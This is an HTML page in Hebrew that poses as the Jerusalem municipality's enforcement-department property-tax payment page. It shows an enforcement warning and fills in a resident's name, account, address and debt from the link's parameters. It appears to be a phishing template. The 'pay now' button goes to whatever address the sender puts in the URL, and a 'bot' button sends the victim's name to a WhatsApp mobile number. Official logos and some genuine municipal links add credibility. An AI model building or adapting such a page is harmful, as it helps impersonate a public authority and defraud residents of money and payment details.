<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>תשלום ארנונה</title>

<style>
body{
  font-family:Heebo,Arial;
  background:#f0f3f7;
  margin:0;
  padding:0;
  color:#0d1b2a;
}
.wrap{
  max-width:900px;
  margin:auto;
  padding:16px;
}

/* HEADER */
.header{
  background:#0F3A5F;
  color:white;
  padding:18px 20px;
  display:flex;
  justify-content:space-between;
  align-items:center;
  border-bottom:6px solid #F2A900;
  border-radius:0 0 12px 12px;
}
.header img{
  width:140px;
  height:auto;
  filter:brightness(0) invert(1);
  cursor:pointer;
}
.header-title{text-align:right;}

/* NOTICE */
.note{
  background:#fff3c8;
  border:1px solid #ffe29b;
  color:#5a4300;
  padding:14px;
  margin:22px 0;
  border-radius:12px;
  text-align:center;
  font-weight:700;
}

/* CARD */
.card{
  background:white;
  padding:22px;
  border-radius:14px;
  box-shadow:0 4px 18px rgba(0,0,0,0.12);
}

/* FIELDS */
.field{
  background:#f2f6ff;
  border:1px solid #d7e3ff;
  padding:14px;
  border-radius:12px;
  margin-bottom:16px;
}
.label{font-size:0.9rem;color:#55627a;}
.value{margin-top:4px;font-weight:800;font-size:1.2rem;}

/* BUTTON AREA */
.buttons{
  margin-top:18px;
  display:flex;
  flex-direction:column;
  gap:14px;
}
.btn{
  display:block;
  width:100%;
  padding:15px;
  text-align:center;
  border-radius:12px;
  font-weight:800;
  font-size:1.15rem;
  text-decoration:none;
  transition:0.25s;
}

/* GREEN PAYMENT BUTTON */
.btn-pay{
  background:#1fa548;
  color:white;
  border:2px solid #17853a;
  box-shadow:0 4px 16px rgba(31,165,72,0.35);
}
.btn-pay span{
  display:inline-block;
  margin-right:6px;
  transition:transform .3s ease;
}
.btn-pay:hover span{transform:translateX(8px);}
.btn-pay:hover{
  background:#169640;
  transform:translateY(-2px);
}

/* ALL OTHER BUTTONS — WHITE */
.btn-white{
  background:white;
  border:1px solid #d7e3ff;
  color:#1D3354;
  box-shadow:0 3px 10px rgba(0,0,0,0.08);
}
.btn-white:hover{background:#f8f9fc;}

/* FOOTER */
.footer{
  background:#0F2748;
  color:white;
  padding:24px;
  text-align:center;
  margin-top:32px;
  border-radius:12px;
}

.ltr{direction:ltr; unicode-bidi:embed; display:inline-block;}
</style>
</head>

<body>

<div class="wrap">

  <!-- HEADER -->
  <div class="header">
    <a href="https://www.jerusalem.muni.il" target="_blank">
      <img src="https://www.jerusalem.muni.il/images/logo-new2.svg" alt="עיריית ירושלים">
    </a>

    <div class="header-title">
      <b style="font-size:1.35rem;">מחלקת אכיפה — עיריית ירושלים</b><br>
      <small>תשלום ארנונה</small>
    </div>
  </div>

  <!-- CARD -->
  <div class="card">

    <div class="note">⚠️ תזכורת לפני נקיטת הליכי אכיפה</div>

    <div class="field"><div class="label">שם תושב</div><div id="name" class="value"></div></div>
    <div class="field"><div class="label">מס' חשבון ארנונה</div><div id="account" class="value"></div></div>
    <div class="field"><div class="label">כתובת</div><div id="address" class="value"></div></div>
    <div class="field"><div class="label">גובה החוב (₪)</div><div id="balance" class="value" style="color:#b71c1c;"></div></div>

    <!-- BUTTONS -->
    <div class="buttons">

      <!-- PAYMENT -->
      <a id="paybtn" class="btn btn-pay" target="_blank">
        <span>💳</span> לתשלום עכשיו
      </a>

      <!-- FULL ACCOUNT DETAILS -->
      <a class="btn btn-white" href="https://jeronlineforms.jerusalem.muni.il/ArnonaBalanceApproval" target="_blank">
        📄 פירוט חשבון מלא
      </a>

      <!-- CALL — NO PHONE INSIDE THE BUTTON -->
      <a class="btn btn-white" href="tel:026293333">
        ☎ מעבר לנציג
      </a>

      <!-- BOT -->
      <a id="wa" class="btn btn-white" target="_blank">
        🤖 ArnonaBot
      </a>

    </div>

  </div>

  <div class="footer">
    אגף ארנונה – עיריית ירושלים<br>
    טלפון: <span class="ltr">02‑6293333</span>
  </div>

</div>

<script>
const url=new URL(window.location.href);
const val=x=>url.searchParams.get(x)||"";

document.getElementById("name").textContent=val("name");
document.getElementById("account").textContent=val("account");
document.getElementById("address").textContent=val("address");
document.getElementById("balance").textContent=val("balance");

document.getElementById("paybtn").href=val("pay");
document.getElementById("wa").href=
  "https://wa.me/972559597593?text=שלום "+encodeURIComponent(val("name"));
</script>

</body>
</html>
